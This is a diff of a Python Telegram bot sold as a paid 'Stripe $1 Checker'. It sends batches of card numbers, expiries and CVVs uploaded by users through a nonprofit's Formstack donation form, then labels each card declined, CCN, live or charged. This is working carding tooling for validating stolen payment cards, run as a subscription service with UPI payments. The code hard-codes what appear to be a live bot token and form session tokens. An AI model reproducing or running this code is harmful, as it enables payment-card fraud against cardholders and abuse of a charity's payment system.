@@ -14,14 +14,12 @@ import telebot
 from telebot import types
 import user_agent
 
-# ─────────────────────────────  CONFIG  ─────────────────────────────
 BOT_TOKEN   = "9135601732:AAFPZcKE7EIIB9ySbiATAtMEl21klsuiETY"
 OWNER_ID    = 7799774057
 CHANNEL_ID  = "@TirexFre"
 CHANNEL_URL = "https://t.me/TirexFre"
 UPI_ID      = "kartikshu@fam"
 DB_FILE     = "db.json"
-
 CONCURRENCY = 10
 
 PLANS = {
@@ -30,71 +28,46 @@ PLANS = {
     "max":   {"name": "MAX",   "limit": 15000, "price": 499}
 }
 
-# ─────────────────────────────  BOT  ────────────────────────────────
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+logging.basicConfig(level=logging.INFO)
 
-# ─────────────────── DUMMY WEB SERVER (Render ke liye) ──────────────
+# --- RENDER PORT BINDING ---
 class DummyHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.end_headers()
         self.wfile.write(b"Bot is alive!")
-
 def run_dummy_server():
     port = int(os.environ.get("PORT", 10000))
-    server = HTTPServer(('0.0.0.0', port), DummyHandler)
-    server.serve_forever()
-
+    HTTPServer(('0.0.0.0', port), DummyHandler).serve_forever()
 threading.Thread(target=run_dummy_server, daemon=True).start()
-# ────────────────────────────────────────────────────────────────────
 
-# ─────────────────────────────  STORAGE  ────────────────────────────
-DEFAULT_DB = {
-    "banned_users": [],
-    "maintenance": False,
-    "owner": OWNER_ID,
-    "users": {},
-    "pending_payments": {},
-    "redeem_codes": {},
-    "stats": {"checked": 0, "hits": 0, "started": str(datetime.utcnow())},
-}
-
+# --- DB ---
+DEFAULT_DB = {"banned_users": [], "maintenance": False, "owner": OWNER_ID, "users": {}, "pending_payments": {}, "redeem_codes": {}, "stats": {"checked": 0, "hits": 0}}
 def load_db():
     if not os.path.exists(DB_FILE):
-        with open(DB_FILE, "w") as f: json.dump(DEFAULT_DB, f, indent=2)
+        with open(DB_FILE, "w") as f: json.dump(DEFAULT_DB, f)
         return json.loads(json.dumps(DEFAULT_DB))
     with open(DB_FILE) as f: db = json.load(f)
     for k, v in DEFAULT_DB.items(): db.setdefault(k, v)
     return db
-
 def save_db(db):
-    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
-
+    with open(DB_FILE, "w") as f: json.dump(db, f)
 db = load_db()
 
-# ─────────────────────────────  STATE  ──────────────────────────────
+# --- STATE & USERS ---
 user_state = {}
-def set_state(uid, st): 
-    if uid not in user_state: user_state[uid] = {}
-    user_state[uid]["state"] = st
-def get_state(uid):     
-    return user_state.get(uid, {}).get("state", "menu")
-def get_user_data(uid):
-    return user_state.get(uid, {})
-
+def set_state(uid, st): user_state[uid] = st
+def get_state(uid): return user_state.get(uid, "menu")
 def get_user(uid):
     uid = str(uid)
-    if uid not in db["users"]:
-        db["users"][uid] = {"sub": "none", "exp": 0, "used": 0, "history": 0, "username": "", "bonus_cards": 0}
+    if uid not in db["users"]: db["users"][uid] = {"sub": "none", "exp": 0, "used": 0, "username": "", "bonus_cards": 0}
     return db["users"][uid]
 
 def check_sub_expiry(uid):
     u = get_user(uid)
     if u["sub"] != "none" and u["exp"] > 0 and time.time() > u["exp"]:
-        u["sub"] = "none"
-        u["exp"] = 0
-        u["used"] = 0
+        u.update({"sub": "none", "exp": 0, "used": 0})
         save_db(db)
 
 def get_remaining(uid):
@@ -103,69 +76,54 @@ def get_remaining(uid):
     if u["sub"] == "none": return u.get("bonus_cards", 0)
     plan = PLANS.get(u["sub"])
     if not plan: return u.get("bonus_cards", 0)
-    rem = (plan["limit"] - u["used"]) + u.get("bonus_cards", 0)
-    return max(0, rem)
+    return max(0, (plan["limit"] - u["used"]) + u.get("bonus_cards", 0))
 
-# ─────────────────────────────  HELPERS  ────────────────────────────
 def is_owner(uid): return uid == db.get("owner", OWNER_ID)
-
 def is_banned(uid):
     u = get_user(uid)
     uname = u.get("username", "").replace("@","").lower()
     return str(uid) in db["banned_users"] or (uname and uname in db["banned_users"])
-
-def is_member(uid) -> bool:
+def is_member(uid):
     if is_owner(uid): return True
-    try:
-        m = bot.get_chat_member(CHANNEL_ID, uid)
-        return m.status in ("member", "administrator", "creator")
-    except Exception as e:
-        logging.warning(f"membership check failed: {e}")
-        return False
+    try: return bot.get_chat_member(CHANNEL_ID, uid).status in ("member", "administrator", "creator")
+    except: return False
 
-# ─────────────────────────────  KEYBOARDS  ──────────────────────────
+# --- KEYBOARDS ---
 def kb_join():
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL))
-    kb.add(types.InlineKeyboardButton("✅ I Joined", callback_data="check_join"))
+    kb.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL), types.InlineKeyboardButton("✅ I Joined", callback_data="check_join"))
     return kb
-
 def kb_menu(uid):
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
     kb.row("💳 Check Cards", "📂 Upload File")
-    kb.row("💎 Subscription Plans", "🔑 Redeem Code")
+    kb.row("💎 Plans", "🔑 Redeem")
     kb.row("📊 My Stats")
     if is_owner(uid): kb.row("🛠 Admin Panel")
     return kb
-
 def kb_cancel():
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
     kb.row("❌ Cancel")
     return kb
-
 def kb_admin():
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("🚫 Ban User",   callback_data="adm_ban"))
-    kb.add(types.InlineKeyboardButton("🛑 Ban Subscription", callback_data="adm_ban_sub"))
-    kb.add(types.InlineKeyboardButton("🎟 Generate Redeem", callback_data="adm_gen_redeem"))
-    kb.add(types.InlineKeyboardButton("🔧 Maintenance OFF" if not db["maintenance"] else "🔧 Maintenance ON", callback_data="adm_maint"))
-    kb.add(types.InlineKeyboardButton("📈 Bot Stats",   callback_data="adm_stats"))
+    kb.add(types.InlineKeyboardButton("🚫 Ban User", callback_data="adm_ban"))
+    kb.add(types.InlineKeyboardButton("🛑 Cancel Sub", callback_data="adm_ban_sub"))
+    kb.add(types.InlineKeyboardButton("🎟 Gen Redeem", callback_data="adm_gen_redeem"))
+    kb.add(types.InlineKeyboardButton("🔧 Maint OFF" if not db["maintenance"] else "🔧 Maint ON", callback_data="adm_maint"))
+    kb.add(types.InlineKeyboardButton("📈 Bot Stats", callback_data="adm_stats"))
     return kb
-
 def kb_maintenance():
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="check_maint"))
     return kb
-
 def kb_plans():
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("PRO (1000 cards) - 149₹", callback_data="buy_pro"))
-    kb.add(types.InlineKeyboardButton("ULTRA (5000 cards) - 299₹", callback_data="buy_ultra"))
-    kb.add(types.InlineKeyboardButton("MAX (15000 cards) - 499₹", callback_data="buy_max"))
+    kb.add(types.InlineKeyboardButton("PRO (1000) - 149₹", callback_data="buy_pro"))
+    kb.add(types.InlineKeyboardButton("ULTRA (5000) - 299₹", callback_data="buy_ultra"))
+    kb.add(types.InlineKeyboardButton("MAX (15000) - 499₹", callback_data="buy_max"))
     return kb
 
-# ─────────────────────────────  GATES  ──────────────────────────────
-def gate(message) -> bool:
+def gate(message):
     uid = message.from_user.id
     if db["maintenance"] and not is_owner(uid):
         bot.reply_to(message, "🛠 <b>Bot is under maintenance.</b>", reply_markup=kb_maintenance())
@@ -178,158 +136,106 @@ def gate(message) -> bool:
         return False
     return True
 
-# ─────────────────────────────  CHECK LOGIC  ────────────────────────
+# --- CHECK LOGIC ---
 def get_bin_info(binn):
     try:
         r = requests.get(f'https://binchk-api.vercel.app/bin={binn}', timeout=5).json()
         return r.get('brand', 'N/A'), r.get('type', 'N/A'), r.get('bank', 'N/A'), r.get('country', 'N/A'), r.get('flag', '🏳️')
-    except Exception: return 'N/A', 'N/A', 'N/A', 'N/A', '🏳️'
+    except: return 'N/A', 'N/A', 'N/A', 'N/A', '🏳️'
 
 def check_stripe(crd):
     crd = crd.strip()
-    if not crd: return (crd, "error", "Empty")
     try: cn, mm, yy, cvv = crd.split('|')
-    except ValueError: return (crd, "error", "Invalid Format")
-    
+    except: return (crd, "error", "Invalid Format", "N/A", "N/A", "N/A", "N/A", "N/A", "🏳️")
     user = user_agent.generate_user_agent()
     headers = {'Accept': 'application/json', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV', 'Origin': 'https://formstack.io', 'Referer': 'https://formstack.io/', 'User-Agent': user}
-    
-    files = [
-        ('inputdate', (None, '11/3/2024 4:21:19')), ('userTimeZone', (None, '300')), ('txtHtmlId', (None, '2hbx1Fv8p-niFCJlWMSc5A')), ('txtOrgId', (None, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
-        ('txtRefreshToken', (None, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')), ('txtSessionID', (None, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
-        ('submitMessage', (None, 'Thank you for your submission!')), ('paymentType', (None, 'Stripe')), ('formName', (None, 'Donation Management Form')), ('hfFileServiceApiKey', (None, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
-        ('FSGFRadioButton356', (None, 'Company%20Donation')), ('Contact.FirstName', (None, 'williams')), ('Contact.LastName', (None, 'hiro')), ('Contact.Email', (None, 'aa0799414021%40gmail.com')), ('Contact.HomePhone', (None, '5124578451')),
-        ('FSGFRadioButton346', (None, 'One-Time%20Donation')), ('FSGFDropdown701', (None, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')), ('Contact.Opportunity.A.Amount', (None, '1')),
-        ('Contact.Opportunity.A.Funding_Program__c', (None, 'a0u8V00000AT2h7QAD')), ('Contact.Opportunity.A.CloseDate', (None, '11%2F03%2F2024')), ('Contact.Opportunity.A.Name', (None, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')), ('Contact.Opportunity.A.RecordTypeId', (None, '0128V000001iNcAQAU')),
-        ('Contact.Opportunity.A.CampaignId', (None, '7018V000000sLgrQAE')), ('Contact.Opportunity.A.Method_of_Payment__c', (None, 'Credit%20Card')), ('Contact.Opportunity.A.StageName', (None, 'Closed%20Won')), ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (None, 'Company%20Donation')),
-        ('FFCreditCard14', (None, cn)), ('FFCVV14', (None, cvv)), ('FFExpiryMM14', (None, mm)), ('FFExpiryYYYY14', (None, yy)), ('Contact.AccountId.Name', (None, 'hiro%20Household')), ('Contact.AccountId.RecordTypeId', (None, '0128V000001iNc8QAE')), ('FSGFShortAnswer240', (None, '11%2F03%2F2024')),
-        ('FSGFShortAnswer446', (None, 'williams_hiro_Monthly_Donation')), ('FSGFShortAnswer929', (None, 'williams_hiro_Annual_Donation')), ('ReturnUrl', (None, 'https://formstack.io/D5036')), ('submitted', (None, '1')),
-    ]
-    
+    files = [('inputdate', (None, '11/3/2024 4:21:19')), ('userTimeZone', (None, '300')), ('txtHtmlId', (None, '2hbx1Fv8p-niFCJlWMSc5A')), ('txtOrgId', (None, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')), ('txtRefreshToken', (None, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')), ('txtSessionID', (None, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')), ('submitMessage', (None, 'Thank you!')), ('paymentType', (None, 'Stripe')), ('formName', (None, 'Donation Management Form')), ('hfFileServiceApiKey', (None, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')), ('FSGFRadioButton356', (None, 'Company%20Donation')), ('Contact.FirstName', (None, 'williams')), ('Contact.LastName', (None, 'hiro')), ('Contact.Email', (None, 'aa0799414021%40gmail.com')), ('Contact.HomePhone', (None, '5124578451')), ('FSGFRadioButton346', (None, 'One-Time%20Donation')), ('FSGFDropdown701', (None, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')), ('Contact.Opportunity.A.Amount', (None, '1')), ('Contact.Opportunity.A.Funding_Program__c', (None, 'a0u8V00000AT2h7QAD')), ('Contact.Opportunity.A.CloseDate', (None, '11%2F03%2F2024')), ('Contact.Opportunity.A.Name', (None, 'New%20yorm')), ('Contact.Opportunity.A.RecordTypeId', (None, '0128V000001iNcAQAU')), ('Contact.Opportunity.A.CampaignId', (None, '7018V000000sLgrQAE')), ('Contact.Opportunity.A.Method_of_Payment__c', (None, 'Credit%20Card')), ('Contact.Opportunity.A.StageName', (None, 'Closed%20Won')), ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (None, 'Company%20Donation')), ('FFCreditCard14', (None, cn)), ('FFCVV14', (None, cvv)), ('FFExpiryMM14', (None, mm)), ('FFExpiryYYYY14', (None, yy)), ('Contact.AccountId.Name', (None, 'hiro')), ('Contact.AccountId.RecordTypeId', (None, '0128V000001iNc8QAE')), ('FSGFShortAnswer240', (None, '11%2F03%2F2024')), ('FSGFShortAnswer446', (None, 'williams')), ('FSGFShortAnswer929', (None, 'williams')), ('ReturnUrl', (None, 'https://formstack.io/D5036')), ('submitted', (None, '1'))]
     try:
-        response = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files, timeout=20)
-        txt = response.text
+        txt = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files, timeout=20).text
         binn = cn[:6]
         brand, ctype, bank, cnt, emj = get_bin_info(binn)
-        
-        if any(k in txt for k in ['declined', 'card number is incorrect', 'Sorry, we do not accept this', 'expiration']): status, msg = "declined", "Declined ❌"
+        if any(k in txt for k in ['declined', 'incorrect', 'Sorry, we do not accept', 'expiration']): status, msg = "declined", "Declined ❌"
         elif 'security code is incorrect' in txt: status, msg = "ccn", "CCN ✅"
         elif 'Your card could not be' in txt: status, msg = "live", "Live ✅"
         else: status, msg = "charge", "CHARGE $1 ✅"
         return (crd, status, msg, binn, brand, ctype, bank, cnt, emj)
-    except Exception as e: return (crd, "error", f"Error: {str(e)[:20]}", "N/A", "N/A", "N/A", "N/A", "N/A", "🏳️")
+    except: return (crd, "error", "Error", "N/A", "N/A", "N/A", "N/A", "N/A", "🏳️")
 
-def parse_creds(raw: str):
-    out = []
-    for line in raw.splitlines():
-        line = line.strip()
-        if not line or line.startswith("#"): continue
-        if len(line.split('|')) == 4: out.append(line)
-    return out
+def parse_creds(raw):
+    return [l.strip() for l in raw.splitlines() if l.strip() and len(l.split('|')) == 4]
 
 def run_check(message, creds):
     uid = message.from_user.id
     check_sub_expiry(uid)
     u = get_user(uid)
-    
     is_own = is_owner(uid)
-    remaining = get_remaining(uid)
-    if remaining <= 0:
+    rem = get_remaining(uid)
+    if rem <= 0:
         set_state(uid, "menu")
-        bot.reply_to(message, f"⚠️ <b>Limit Exhausted!</b> Upgrade plan.", reply_markup=kb_menu(uid))
-        return
-
+        return bot.reply_to(message, f"⚠️ <b>Limit Exhausted!</b> Upgrade plan.", reply_markup=kb_menu(uid))
     total = len(creds)
-    if not is_own and total > remaining:
-        total = remaining
+    if not is_own and total > rem:
+        total = rem
         creds = creds[:total]
         bot.send_message(message.chat.id, f"⚠️ Checking only <b>{total}</b> cards due to limit.")
-
-    if total == 0: return
-
     status_msg = bot.reply_to(message, f"⏳ Starting check on <b>{total}</b> cards...\n0/{total} done")
-
-    hits, declined, errors = [], 0, 0
-    done = 0
-    last_edit = 0
+    hits, declined, errors, done, last_edit = [], 0, 0, 0, 0
     lock = threading.Lock()
-
-    def _edit_status():
+    def _edit():
         try: bot.edit_message_text(f"⏳ <b>Checking...</b>\nProgress: {done}/{total}\n✅ Hits: {len(hits)}\n❌ Declined: {declined}", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
-        except Exception: pass
-
-    def worker(card_line):
+        except: pass
+    def worker(c):
         nonlocal declined, errors, done, last_edit
-        res = check_stripe(card_line)
+        res = check_stripe(c)
         with lock:
-            status = res[1]
-            if status in ("ccn", "live", "charge"): hits.append(res)
-            elif status == "declined": declined += 1
+            if res[1] in ("ccn", "live", "charge"): hits.append(res)
+            elif res[1] == "declined": declined += 1
             else: errors += 1
             done += 1
             if time.time() - last_edit > 2.5 or done == total:
                 last_edit = time.time()
-                _edit_status()
-
+                _edit()
     with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
-        futures = [ex.submit(worker, c) for c in creds]
-        for _ in as_completed(futures): pass
-
+        for _ in as_completed([ex.submit(worker, c) for c in creds]): pass
     if not is_own:
         if u["sub"] != "none":
             plan = PLANS.get(u["sub"], {"limit": 0})
-            if u["used"] + total <= plan["limit"]:
-                u["used"] += total
+            if u["used"] + total <= plan["limit"]: u["used"] += total
             else:
-                used_from_plan = plan["limit"] - u["used"]
+                u["bonus_cards"] = max(0, u.get("bonus_cards", 0) - (total - (plan["limit"] - u["used"])))
                 u["used"] = plan["limit"]
-                u["bonus_cards"] = max(0, u.get("bonus_cards", 0) - (total - used_from_plan))
-        else:
-            u["bonus_cards"] = max(0, u.get("bonus_cards", 0) - total)
-
-    u["history"] = u.get("history", 0) + total
+        else: u["bonus_cards"] = max(0, u.get("bonus_cards", 0) - total)
     db["stats"]["checked"] += total
     db["stats"]["hits"] += len(hits)
     save_db(db)
-
     lines = []
     if hits:
         lines.append("🎯 <b>HIT RESULTS</b>\n")
         for h in hits:
-            crd, status, msg, binn, brand, ctype, bank, cnt, emj = h
-            lines.append(f"💳 <code>{crd}</code>\n↯ <b>Response:</b> {msg}\n↯ <b>BIN:</b> {binn} - {brand} - {ctype}\n↯ <b>Bank:</b> {bank}\n(Checked by TirexJod Bot)\n━━━━━━━━━━━━━━━━━━━━")
-        lines.append("")
-    
+            lines.append(f"💳 <code>{h[0]}</code>\n↯ <b>Response:</b> {h[2]}\n↯ <b>BIN:</b> {h[3]} - {h[4]}\n↯ <b>Bank:</b> {h[6]}\n(Checked by TirexJod Bot)\n━━━━━━━━━━━━━━━━━━━━")
     rem_str = "Unlimited (Owner)" if is_own else str(get_remaining(uid))
     lines.append(f"📊 <b>SUMMARY</b>\nTotal: <code>{total}</code>\nDeclined: <code>{declined}</code>\nErrors: <code>{errors}</code>\nSuccessful: <code>{len(hits)}</code>\n\n🔋 <b>Remaining Limit:</b> <code>{rem_str}</code>")
-    result_text = "\n".join(lines)
-    
-    try: bot.edit_message_text(result_text[:4000], chat_id=status_msg.chat.id, message_id=status_msg.message_id)
-    except Exception: bot.send_message(message.chat.id, result_text[:4000])
-
+    res_txt = "\n".join(lines)
+    try: bot.edit_message_text(res_txt[:4000], chat_id=status_msg.chat.id, message_id=status_msg.message_id)
+    except: bot.send_message(message.chat.id, res_txt[:4000])
     if hits:
-        fname = f"stripe_hits_{uid}_{int(time.time())}.txt"
-        with open(fname, "w", encoding="utf-8") as f:
+        fname = f"hits_{uid}_{int(time.time())}.txt"
+        with open(fname, "w") as f:
             for h in hits: f.write(f"{h[0]} -> {h[2]}\n")
         with open(fname, "rb") as f: bot.send_document(message.chat.id, f, caption=f"✅ <b>{len(hits)}</b> hits found.")
-        try: os.remove(fname)
-        except Exception: pass
-    
+        os.remove(fname)
     if not is_own and get_remaining(uid) <= 0:
         bot.send_message(message.chat.id, "❌ <b>Limit Finished!</b> Upgrade to check more.", reply_markup=kb_plans())
 
-# ─────────────────────────────  MENU HANDLERS  ──────────────────────
+# --- HANDLERS ---
 @bot.message_handler(commands=["start"])
 def cmd_start(message):
     uid = message.from_user.id
-    u = get_user(uid)
-    u["username"] = message.from_user.username or ""
+    get_user(uid)["username"] = message.from_user.username or ""
     save_db(db)
-    
     if db["maintenance"] and not is_owner(uid): return bot.reply_to(message, "🛠 <b>Maintenance</b>", reply_markup=kb_maintenance())
     if is_banned(uid): return bot.reply_to(message, "🚫 Banned.")
     if not is_member(uid): return bot.reply_to(message, "📢 <b>Join channel!</b>", reply_markup=kb_join())
-    
     set_state(uid, "menu")
     bot.reply_to(message, "✅ <b>Welcome to Stripe $1 Checker!</b>", reply_markup=kb_menu(uid))
 
@@ -337,8 +243,7 @@ def cmd_start(message):
 def cb_check_join(cq):
     if is_member(cq.from_user.id):
         set_state(cq.from_user.id, "menu")
-        try: bot.edit_message_text("✅ Verified.", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
-        except Exception: pass
+        bot.edit_message_text("✅ Verified.", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
         bot.send_message(cq.from_user.id, "🏠 Menu:", reply_markup=kb_menu(cq.from_user.id))
     else: bot.answer_callback_query(cq.id, "❌ Join first.", show_alert=True)
 
@@ -364,9 +269,8 @@ def menu_stats(message):
     uid = message.from_user.id
     u = get_user(uid)
     plan = PLANS.get(u["sub"], {"name": "None", "limit": 0})
-    exp_str = datetime.fromtimestamp(u["exp"]).strftime('%d-%b-%Y') if u["exp"] > 0 else "N/A"
     rem_str = "Unlimited (Owner)" if is_owner(uid) else str(get_remaining(uid))
-    bot.reply_to(message, f"📊 <b>Your Stats</b>\n💎 Plan: {plan['name']}\n📅 Expires: {exp_str}\n🔋 Remaining: <code>{rem_str}</code>", reply_markup=kb_menu(uid))
+    bot.reply_to(message, f"📊 <b>Your Stats</b>\n💎 Plan: {plan['name']}\n🔋 Remaining: <code>{rem_str}</code>", reply_markup=kb_menu(uid))
 
 @bot.message_handler(func=lambda m: m.text == "❌ Cancel")
 def menu_cancel(message):
@@ -387,14 +291,12 @@ def on_creds(message):
 @bot.message_handler(content_types=["document"], func=lambda m: get_state(m.from_user.id) == "file")
 def on_file(message):
     if not message.document.file_name.endswith(".txt"): return bot.reply_to(message, "❌ Need .txt")
-    try: text = bot.download_file(bot.get_file(message.document.file_id).file_path).decode("utf-8", errors="ignore")
-    except Exception as e: return bot.reply_to(message, f"❌ Error: {e}")
+    text = bot.download_file(bot.get_file(message.document.file_id).file_path).decode("utf-8", errors="ignore")
     creds = parse_creds(text)
     set_state(message.from_user.id, "menu")
     threading.Thread(target=run_check, args=(message, creds), daemon=True).start()
 
-# ─────────────────────────────  SUBSCRIPTION & UPI  ─────────────────
-@bot.message_handler(func=lambda m: m.text == "💎 Subscription Plans")
+@bot.message_handler(func=lambda m: m.text == "💎 Plans")
 def menu_plans(message):
     if not gate(message): return
     txt = "💎 <b>Plans (1 Week)</b>\n" + "\n".join([f"🔹 {v['name']}: {v['limit']} cards - <b>{v['price']}₹</b>" for k,v in PLANS.items()])
@@ -420,11 +322,10 @@ def on_screenshot(message):
     uid = message.from_user.id
     data = user_state.get(uid, {})
     if "plan" not in data: return bot.reply_to(message, "❌ Error.")
-    db["pending_payments"][str(uid)] = {"plan": data["plan"], "utr": data["utr"], "photo_id": message.photo[-1].file_id, "time": time.time()}
+    db["pending_payments"][str(uid)] = {"plan": data["plan"], "utr": data["utr"]}
     save_db(db)
     bot.reply_to(message, "✅ <b>Payment submitted!</b> Wait for approval.", reply_markup=kb_menu(uid))
     set_state(uid, "menu")
-    
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"appr_{uid}"), types.InlineKeyboardButton("❌ Reject", callback_data=f"rej_{uid}"))
     bot.send_photo(OWNER_ID, message.photo[-1].file_id, caption=f"💰 <b>New Payment!</b>\nUser: @{message.from_user.username or uid}\nPlan: {PLANS[data['plan']]['name']}\nUTR: <code>{data['utr']}</code>", reply_markup=kb)
@@ -438,15 +339,14 @@ def cb_approve_payment(cq):
     save_db(db)
     u = get_user(uid_str)
     if action == "appr":
-        u["sub"], u["exp"], u["used"] = pd["plan"], time.time() + (7 * 24 * 60 * 60), 0
+        u.update({"sub": pd["plan"], "exp": time.time() + (7 * 24 * 60 * 60), "used": 0})
         save_db(db)
         bot.edit_message_caption("✅ Approved", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
         bot.send_message(uid_str, f"🎉 <b>Subscription Activated!</b>\nPlan: {PLANS[pd['plan']]['name']}\nValid: 7 Days", reply_markup=kb_menu(uid_str))
     else:
         bot.edit_message_caption("❌ Rejected", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
 
-# ─────────────────────────────  REDEEM CODE  ────────────────────────
-@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Code")
+@bot.message_handler(func=lambda m: m.text == "🔑 Redeem")
 def menu_redeem(message):
     if not gate(message): return
     set_state(message.from_user.id, "wait_redeem")
@@ -458,8 +358,7 @@ def on_redeem(message):
     code, uid = message.text.strip().upper(), str(message.from_user.id)
     if code not in db["redeem_codes"]: return bot.reply_to(message, "❌ Invalid Code.")
     rc = db["redeem_codes"][code]
-    if len(rc["used_by"]) >= rc["limit"]: return bot.reply_to(message, "❌ Limit reached.")
-    if uid in rc["used_by"]: return bot.reply_to(message, "❌ Already used.")
+    if len(rc["used_by"]) >= rc["limit"] or uid in rc["used_by"]: return bot.reply_to(message, "❌ Limit reached or Already used.")
     u = get_user(uid)
     u["bonus_cards"] = u.get("bonus_cards", 0) + rc["cards"]
     rc["used_by"].append(uid)
@@ -467,7 +366,6 @@ def on_redeem(message):
     set_state(uid, "menu")
     bot.reply_to(message, f"✅ <b>Redeemed!</b> +{rc['cards']} cards.", reply_markup=kb_menu(uid))
 
-# ─────────────────────────────  ADMIN PANEL  ────────────────────────
 @bot.callback_query_handler(func=lambda c: c.data == "adm_ban")
 def cb_ban(cq):
     if not is_owner(cq.from_user.id): return
@@ -497,8 +395,7 @@ def cb_ban_sub(cq):
 def cb_cancel_sub(cq):
     if not is_owner(cq.from_user.id): return
     uid = cq.data.split("_")[1]
-    u = get_user(uid)
-    u.update({"sub": "none", "exp": 0, "used": 0})
+    get_user(uid).update({"sub": "none", "exp": 0, "used": 0})
     save_db(db)
     bot.edit_message_text(f"🛑 Sub cancelled for {uid}.", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
     try: bot.send_message(uid, "🛑 Sub cancelled by Admin.")
@@ -515,4 +412,26 @@ def on_gen_redeem(message):
     if message.text == "❌ Cancel": return menu_cancel(message)
     try:
         uses, cards = map(int, message.text.split())
-        code =
+        code = "TJ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+        db["redeem_codes"][code] = {"limit": uses, "cards": cards, "used_by": []}
+        save_db(db)
+        set_state(message.from_user.id, "menu")
+        bot.reply_to(message, f"✅ <b>Code Generated!</b>\n<code>{code}</code>\nUses: {uses} | Cards: {cards}", reply_markup=kb_menu(message.from_user.id))
+    except:
+        bot.reply_to(message, "❌ Invalid format. Send like `5 1000`.")
+
+@bot.callback_query_handler(func=lambda c: c.data == "adm_maint")
+def cb_maint(cq):
+    if not is_owner(cq.from_user.id): return
+    db["maintenance"] = not db["maintenance"]
+    save_db(db)
+    bot.edit_message_text(f"🔧 Maint: <b>{'ON' if db['maintenance'] else 'OFF'}</b>", chat_id=cq.message.chat.id, message_id=cq.message.message_id, reply_markup=kb_admin())
+
+@bot.callback_query_handler(func=lambda c: c.data == "adm_stats")
+def cb_stats(cq):
+    if not is_owner(cq.from_user.id): return
+    s = db["stats"]
+    bot.answer_callback_query(cq.id, f"Checked: {s['checked']} | Hits: {s['hits']}", show_alert=True)
+
+if __name__ == "__main__":
+    bot.infinity_polling(timeout=60, long_polling_timeout=60)
